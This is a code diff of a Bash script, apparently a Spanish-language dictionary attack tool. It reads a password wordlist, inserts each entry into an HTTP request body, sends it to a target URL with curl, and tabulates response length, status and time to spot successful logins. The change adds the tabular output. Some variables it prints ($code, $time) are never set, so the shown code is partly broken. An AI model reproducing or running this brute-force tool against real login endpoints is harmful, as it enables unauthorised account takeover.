@@ -60,7 +60,8 @@ usage(){
 # Main function 
 main() {
   method="POST"
-
+  payloadFile=0
+  
   # Options
   while getopts "a:d:f:hm:p:r:s:u:v" opt; do
     case ${opt} in
@@ -134,19 +135,25 @@ dictionaryAttack(){
     errorMessage "Debe poner la ruta del archivo"
   fi
   
-  echo -e "${greenColor}[*] Iniciando ataque ${endColor}"
+  echo -e "${greenColor}[*] Iniciando ataque ${endColor}\n"
 
   configHeader
   payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
   payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
   fileName=$(setFileName $targetUrl)
- 
+
+  fmt="%-25s | %-25s | %-15s | %-12s\n"
+  printf "$fmt" "PASSWORD" "TOTAL_CARACTERES" "HTTP_CODE" "RESPONSE_TIME"
+  echo "-------------------------------------------------------------------------------------------"
   while read  -r  line; do
     dataRaw="${payload1}${line}${payload2}"
-    # echo "curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
-    result=$(curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
-    echo $result >> $fileName
-    echo -e $result
+    #echo "curl --silent --write-out '%{response_code} %{time_total}' ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
+    result=$(curl --silent ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
+    #echo $result
+    totalCharacters=$(echo -n $result | wc -c) 
+    printf "$fmt" "$line" "$totalCharacters" "$code" "$time"
+    # toSave="Password: $line | Total caracteres: $totalCharacters"
+    # echo $toSave >> $fileName
     setSleep
   done < $filePath
   echo -e "${greenColor}[*] Ataque culminado ${endColor}"
